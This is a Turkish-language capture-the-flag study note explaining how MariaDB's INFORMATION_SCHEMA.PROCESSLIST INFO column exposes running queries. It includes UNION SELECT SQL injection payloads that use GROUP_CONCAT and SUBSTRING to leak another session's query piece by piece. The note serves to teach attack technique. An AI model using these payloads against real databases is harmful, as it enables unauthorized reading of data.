# MariaDB — `INFORMATION_SCHEMA.PROCESSLIST`

## 📌 PROCESSLIST Nedir?

MariaDB'de:

```sql
INFORMATION_SCHEMA.PROCESSLIST
```

sunucuda **o anda çalışan SQL thread'leri ve sorguları** hakkında bilgi verir.

Örneğin:

```sql
SELECT *
FROM information_schema.PROCESSLIST;
```

çalışan process'leri görüntülemek için kullanılabilir.

---

## 🎯 Önemli Kolon: `INFO`

`PROCESSLIST` tablosundaki en önemli kolonlardan biri:

```text
INFO
```

`INFO`, ilgili thread'in **o anda çalıştırdığı SQL statement'ı** içerir.

Örneğin:

```text
USER    COMMAND   TIME   INFO
admin   Query     5      SELECT * FROM users
```

Burada `INFO`:

```sql
SELECT * FROM users
```

değerini içerir.

---

## 🧠 CTF'deki Mantık

Rabbit Hole CTF'de `admin` kullanıcısının belirli aralıklarla login/query işlemleri yaptığı görülüyor.

Anti-brute-force mekanizmasının çalıştırdığı SQL query'si de o anda çalışırken:

```text
Application
    │
    ▼
SQL Query çalıştırılıyor
    │
    ▼
MariaDB PROCESSLIST
    │
    ▼
INFO
    │
    ▼
Çalışan SQL Query görülebiliyor
```

Buradaki fikir:

> **Query çalışırken `PROCESSLIST.INFO` okunursa, uygulamanın çalıştırdığı SQL sorgusunu dışarı sızdırabiliriz.**

---

## 🔎 `PROCESSLIST` İçerisinden `INFO` Okumak

SQL Injection üzerinden örneğin:

```sql
' UNION SELECT 1,INFO
FROM information_schema.PROCESSLIST -- -
```

mantığı kullanılabilir.

Burada:

```text
UNION
  ↓
PROCESSLIST
  ↓
INFO
  ↓
Çalışan SQL Query
```

elde edilmeye çalışılıyor.

---

## 📦 `GROUP_CONCAT(INFO)`

Birden fazla process varsa `INFO` değerlerini tek bir sonuçta birleştirmek için:

```sql
SELECT GROUP_CONCAT(INFO)
FROM information_schema.PROCESSLIST;
```

kullanılabilir.

Mantık:

```text
PROCESS 1 → INFO
PROCESS 2 → INFO
PROCESS 3 → INFO
       ↓
GROUP_CONCAT()
       ↓
Tek bir string
```

---

## ✂️ `SUBSTRING()` ile Query'yi Parçalara Ayırmak

Çalışan query uzun olabilir veya response'un gösterebileceği karakter sayısı sınırlı olabilir.

Bu durumda:

```sql
SUBSTRING(data, start, length)
```

kullanılır.

Örneğin:

```sql
SUBSTRING(data, 1, 16)
```

→ İlk 16 karakteri verir.

```sql
SUBSTRING(data, 17, 16)
```

→ 17. karakterden başlayarak sonraki 16 karakteri verir.

```sql
SUBSTRING(data, 33, 16)
```

→ 33. karakterden başlayarak sonraki 16 karakteri verir.

---

## 💉 CTF'deki Payload

Writeup'taki mantık:

```sql
' UNION SELECT 1,
SUBSTRING(
    (SELECT GROUP_CONCAT(INFO)
     FROM information_schema.PROCESSLIST),
    1,
    16
) -- -
```

Burada işlem sırası:

```text
PROCESSLIST
     ↓
INFO kolonunu al
     ↓
GROUP_CONCAT(INFO)
     ↓
Tek bir string oluştur
     ↓
SUBSTRING(..., 1, 16)
     ↓
İlk 16 karakteri göster
```

Daha sonra başlangıç pozisyonu değiştirilerek query'nin devamı okunabilir:

```sql
SUBSTRING(data, 17, 16)
```

```sql
SUBSTRING(data, 33, 16)
```

```sql
SUBSTRING(data, 49, 16)
```

---

## 📝 Özet

| Kavram               | Görevi                                                            |
| -------------------- | ----------------------------------------------------------------- |
| `INFORMATION_SCHEMA` | MariaDB hakkında metadata bilgileri                               |
| `PROCESSLIST`        | Çalışan database thread/query'leri                                |
| `INFO`               | Thread'in çalıştırdığı SQL statement                              |
| `GROUP_CONCAT()`     | Birden fazla `INFO` değerini birleştirir                          |
| `SUBSTRING()`        | Sonucu parçalara ayırarak okumayı sağlar                          |
| `UNION SELECT`       | SQL Injection üzerinden sonucu response'a taşımak için kullanılır |

### 🔥 CTF'deki Ana Fikir

```text
SQL Injection
      ↓
INFORMATION_SCHEMA.PROCESSLIST
      ↓
INFO
      ↓
Çalışmakta olan SQL Query
      ↓
GROUP_CONCAT()
      ↓
SUBSTRING()
      ↓
Query'yi parça parça leak et
```

> **En önemli nokta:** `PROCESSLIST` burada sadece "process listelemek" için kullanılmıyor. `INFO` kolonundan **o anda çalışan SQL sorgusunu okuyabilmek**, CTF'deki bilgi sızıntısının temelini oluşturuyor.
